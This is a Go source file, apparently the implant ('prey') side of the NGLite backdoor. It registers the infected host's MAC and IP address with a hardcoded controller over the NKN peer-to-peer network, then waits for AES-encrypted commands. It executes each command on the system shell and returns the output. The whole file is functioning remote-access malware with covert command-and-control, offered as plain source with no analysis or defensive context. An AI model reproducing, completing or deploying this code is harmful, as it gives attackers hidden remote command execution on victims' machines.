package main

import (
	"encoding/hex"
	"flag"
	"fmt"

	"NGLite/conf"
	"NGLite/module/cipher"
	"NGLite/module/command"
	"NGLite/module/getmac"

	nkn "github.com/nknorg/nkn-sdk-go"
)

var preyid string

func main() {
	var Seed string
	flag.StringVar(&Seed, "g", "default", "group")
	flag.Parse()
	if Seed == "default" {
		Seed = conf.Seedid
	}

	initonce(Seed)
	Preylistener(Seed)

}

func Preylistener(seedid string) {
	err := func() error {


		seed, _ := hex.DecodeString(seedid)
		account, err := nkn.NewAccount(seed)
		if err != nil {
			return err
		}


		Listener, err := nkn.NewMultiClient(account, preyid, conf.TransThreads, false, clientConf)

		if err != nil {
			return err
		}

		<-Listener.OnConnect.C

		for {
			msg := <-Listener.OnMessage.C

			if AesDecode(string(msg.Data)) != "mayAttack" {
				msg.Reply(Runcommand(AesDecode(string(msg.Data))))
			}

		}

	}()
	if err != nil {
		fmt.Println(err)
	}
}

var clientConf *nkn.ClientConfig

func initonce(seedid string) {

	clientConf = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              4096,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}


	preyid = getmac.GetMacAddrs()[0] + getmac.GetIPs()[0]

	seed, _ := hex.DecodeString(seedid)
	account, err := nkn.NewAccount(seed)
	if err != nil {
		fmt.Println(err)
	}
	replymsg, err := Sender(preyid, conf.Hunterid, account, RsaEncode([]byte(preyid)))
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(replymsg)
	}
}

func RsaEncode(strbyte []byte) []byte {
	crypttext, err := cipher.RsaEncrypt(strbyte, []byte(conf.RsaPublicKey))
	if err != nil {
		fmt.Println(err)
	}
	return crypttext
}

func AesDecode(str string) string {
	plaintext, err := cipher.AesCbcDecrypt([]byte(str), []byte(conf.AesKey))
	if err != nil {
		fmt.Println(err)
		return "mayAttack"
	} else {
		return string(plaintext)

	}

}

func Sender(srcid string, dst string, acc *nkn.Account, msg interface{}) (string, error) {
	Listener, err := nkn.NewMultiClient(acc, dst, conf.TransThreads, false, nil)
	if err != nil {
		return "error", err
	}
	Sender, err := nkn.NewMultiClient(acc, srcid, conf.TransThreads, false, clientConf)
	if err != nil {
		return "error", err
	}

	<-Sender.OnConnect.C

	onReply, err := Sender.Send(nkn.NewStringArray(Listener.Address()), msg, nil)
	if err != nil {

		return "error", err
	}
	reply := <-onReply.C

	return string(reply.Data), nil
}

func Runcommand(cmd string) string {
	_, out, _ := command.NewCommand().Exec(cmd)
	return out
}
